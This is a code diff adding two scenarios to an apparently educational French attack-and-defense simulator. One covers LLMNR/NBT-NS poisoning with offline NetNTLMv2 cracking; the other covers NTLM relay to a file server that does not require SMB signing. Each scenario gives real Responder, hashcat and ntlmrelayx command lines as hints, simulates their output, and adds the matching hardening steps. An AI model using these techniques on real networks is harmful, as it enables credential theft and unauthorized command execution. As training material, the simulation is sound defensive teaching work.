@@ -4422,6 +4422,159 @@ const SCENARIOS = [
     log.push({t:"[+] Profil administrateur exfiltré depuis un site tiers via la réflexion CORS.", cls:'ok'});
     return {log, success:true};
   }
+},
+
+/* ===================== 56. Empoisonnement LLMNR/NBT-NS ===================== */
+{
+  id:'llmnr-nbtns-poisoning-hash-capture',
+  title:'La résolution de noms LLMNR/NBT-NS toujours active permet de capturer un hash NetNTLMv2',
+  category:'Réseau & annuaires (empoisonnement LLMNR/NBT-NS)',
+  attack:{
+    who:'Vous incarnez bob, un attaquant disposant d\'un simple accès au même segment réseau que les postes de target-lab, sans le moindre identifiant de domaine.',
+    desc:"LLMNR et NBT-NS restent activés sur le parc : lorsqu'une requête DNS échoue (par exemple un partage mal orthographié), les postes diffusent une requête de résolution en broadcast que n'importe quelle machine du segment peut usurper. En répondant à la place du vrai serveur, vous incitez le poste à s'authentifier auprès de vous — capturant ainsi son challenge-response NetNTLMv2.",
+    hints:[
+      "`responder -I eth0` se met à l'écoute des requêtes de résolution LLMNR/NBT-NS diffusées en broadcast sur l'interface réseau, prêt à usurper la réponse de n'importe quel nom introuvable en DNS.",
+      "Un poste utilisateur tente de joindre un partage mal orthographié (`\\\\fileservr\\shared` au lieu de `\\\\fileserver\\shared`) : la résolution DNS échoue, LLMNR prend le relais, et votre réponse usurpée déclenche une tentative d'authentification NTLM du poste vers vous.",
+      "`responder --dump` affiche le challenge-response NetNTLMv2 ainsi capturé pour le compte `alice`, jamais transmis en clair mais entièrement hors-ligne crackable.",
+      "`hashcat --mode 5600 alice.ntlmv2 rockyou.txt` casse ce hash hors-ligne et révèle le mot de passe du compte `alice` en clair."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
+    desc:"Désactivez LLMNR et NBT-NS sur l'ensemble du parc (par stratégie de groupe), pour que l'échec d'une résolution DNS ne se traduise plus jamais par une diffusion en broadcast interceptable.",
+    hints:[
+      "Éditez `/etc/network/name-resolution.yml` avec `nano` et passez `llmnrEnabled` et `nbtnsEnabled` à `false`.",
+      "`verify` confirme que LLMNR et NBT-NS sont désormais désactivés."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['network']},
+      '/etc/network':{type:'dir',perm:'755',owner:'root',children:['name-resolution.yml']},
+      '/etc/network/name-resolution.yml':{type:'file',perm:'644',owner:'root',size:60,
+        content:"llmnrEnabled: true\nnbtnsEnabled: true\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^responder\s+-I\s+eth0$/, run(state, print){
+        const active = /llmnrEnabled:\s*true/.test(state.vfs['/etc/network/name-resolution.yml'].content)
+                    || /nbtnsEnabled:\s*true/.test(state.vfs['/etc/network/name-resolution.yml'].content);
+        if(!active){ print("[i] Aucune requête LLMNR/NBT-NS reçue : ces protocoles semblent désactivés sur le segment.", 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.listening = true;
+        print('[+] Poison en cours sur LLMNR (UDP/5355) et NBT-NS (UDP/137)...', 'ok');
+      }
+    },
+    { pattern:/^responder\s+--dump$/, run(state, print){
+        const active = /llmnrEnabled:\s*true/.test(state.vfs['/etc/network/name-resolution.yml'].content)
+                    || /nbtnsEnabled:\s*true/.test(state.vfs['/etc/network/name-resolution.yml'].content);
+        if(!active){ print('responder: aucun challenge-response capturé.', 'err'); return; }
+        if(!state.flags || !state.flags.listening){ print('responder: aucune capture en cours — lancez d\'abord l\'écoute.', 'err'); return; }
+        state.flags.hashCaptured = true;
+        print('[SMB] NTLMv2-SSP Hash : alice::LAB:1122334455667788:9a3fd2...(hash tronqué)', 'out');
+      }
+    },
+    { pattern:/^hashcat\s+--mode\s+5600\s+alice\.ntlmv2\s+rockyou\.txt$/, run(state, print){
+        if(!state.flags || !state.flags.hashCaptured){ print("hashcat: fichier alice.ntlmv2 introuvable — capturez d'abord un challenge-response.", 'err'); return; }
+        state.flags.cracked = true;
+        print('alice::LAB:1122334455667788:9a3fd2...:Automne2024!', 'ok');
+        print('[+] Mot de passe cassé : Automne2024!', 'ok');
+        print("FLAG{llmnr_nbtns_poisoning_netntlmv2_capture}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.cracked === true; },
+  defenseCheck(state){
+    return !/llmnrEnabled:\s*true/.test(state.vfs['/etc/network/name-resolution.yml'].content)
+        && !/nbtnsEnabled:\s*true/.test(state.vfs['/etc/network/name-resolution.yml'].content);
+  },
+  replay(state){
+    const log=[];
+    const active = /llmnrEnabled:\s*true/.test(state.vfs['/etc/network/name-resolution.yml'].content)
+                || /nbtnsEnabled:\s*true/.test(state.vfs['/etc/network/name-resolution.yml'].content);
+    log.push({t:'$ responder --dump', cls:'prompt-line'});
+    if(!active){
+      log.push({t:'responder: aucun challenge-response capturé.', cls:'err'});
+      log.push({t:"[-] LLMNR et NBT-NS sont désormais désactivés : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'[SMB] NTLMv2-SSP Hash : alice::LAB:...:9a3fd2...', cls:'ok'});
+    log.push({t:'[+] Mot de passe cassé hors-ligne : Automne2024!', cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 57. Relais NTLM faute de signature SMB ===================== */
+{
+  id:'ntlm-relay-smb-signing-disabled',
+  title:'La signature SMB non appliquée permet de relayer une authentification NTLM interceptée',
+  category:'Réseau & annuaires (relais NTLM, signature SMB absente)',
+  attack:{
+    who:'Vous incarnez bob : une authentification NTLM d\'un compte de service vient d\'être interceptée vers votre serveur malveillant (hors périmètre de ce scénario, obtenue par exemple via l\'empoisonnement LLMNR). Il vous reste à en tirer parti sans jamais avoir besoin de la casser.',
+    desc:"`fileserver02` n'exige pas la signature SMB. Plutôt que de perdre du temps à casser hors-ligne l'authentification NTLM interceptée, vous pouvez la relayer telle quelle vers ce second serveur : sans signature obligatoire, rien ne permet à `fileserver02` de détecter qu'il s'agit d'une session détournée plutôt que d'une connexion directe du compte de service.",
+    hints:[
+      "`ntlmrelayx --target smb://fileserver02` relaie l'authentification NTLM interceptée directement vers ce serveur — sans jamais avoir besoin de connaître ni de casser le mot de passe du compte.",
+      "Faute de signature SMB obligatoire, `fileserver02` accepte la session relayée comme si le compte de service s'était connecté directement : vous voilà authentifié en tant que `svc-fileshare`, qui se trouve être administrateur local sur cette machine.",
+      "`ntlmrelayx exec --target smb://fileserver02 --command whoami` exécute une commande sur `fileserver02` via la session relayée, confirmant l'identité obtenue et le niveau de privilège."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur infrastructure chargé de corriger la faille.',
+    desc:"Exigez la signature SMB sur fileserver02, pour que toute session ne portant pas une signature valide (comme une session relayée) soit automatiquement rejetée.",
+    hints:[
+      "Éditez `/etc/network/smb-policy.yml` avec `nano` et passez `smbSigningRequired` à `true`.",
+      "`verify` confirme que la signature SMB est désormais exigée sur fileserver02."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['network']},
+      '/etc/network':{type:'dir',perm:'755',owner:'root',children:['smb-policy.yml']},
+      '/etc/network/smb-policy.yml':{type:'file',perm:'644',owner:'root',size:50,
+        content:"smbSigningRequired: false\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^ntlmrelayx\s+--target\s+smb:\/\/fileserver02$/, run(state, print){
+        const signingRequired = /smbSigningRequired:\s*true/.test(state.vfs['/etc/network/smb-policy.yml'].content);
+        if(signingRequired){ print('STATUS_ACCESS_DENIED : signature SMB requise, session relayée rejetée par fileserver02.', 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.relayedSessionOpen = true;
+        print("[+] Authentification NTLM relayée acceptée par fileserver02 : session ouverte en tant que svc-fileshare.", 'ok');
+      }
+    },
+    { pattern:/^ntlmrelayx\s+exec\s+--target\s+smb:\/\/fileserver02\s+--command\s+whoami$/, run(state, print){
+        if(!state.flags || !state.flags.relayedSessionOpen){ print('ntlmrelayx: aucune session relayée active vers fileserver02.', 'err'); return; }
+        state.flags.compromised = true;
+        print('lab\\svc-fileshare (administrateur local sur fileserver02)', 'out');
+        print("[+] Commande exécutée sur fileserver02 via la session relayée, sans jamais connaître le mot de passe.", 'ok');
+        print("FLAG{ntlm_relay_smb_signing_disabled_fileserver02}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.compromised === true; },
+  defenseCheck(state){ return /smbSigningRequired:\s*true/.test(state.vfs['/etc/network/smb-policy.yml'].content); },
+  replay(state){
+    const log=[];
+    const signingRequired = /smbSigningRequired:\s*true/.test(state.vfs['/etc/network/smb-policy.yml'].content);
+    log.push({t:'$ ntlmrelayx --target smb://fileserver02', cls:'prompt-line'});
+    if(signingRequired){
+      log.push({t:'STATUS_ACCESS_DENIED : signature SMB requise, session relayée rejetée.', cls:'err'});
+      log.push({t:"[-] La signature SMB est désormais exigée sur fileserver02 : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'[+] Session relayée acceptée en tant que svc-fileshare, administrateur local.', cls:'ok'});
+    log.push({t:"[+] Commande exécutée sur fileserver02 sans jamais connaître le mot de passe.", cls:'ok'});
+    return {log, success:true};
+  }
 }
 
 ];
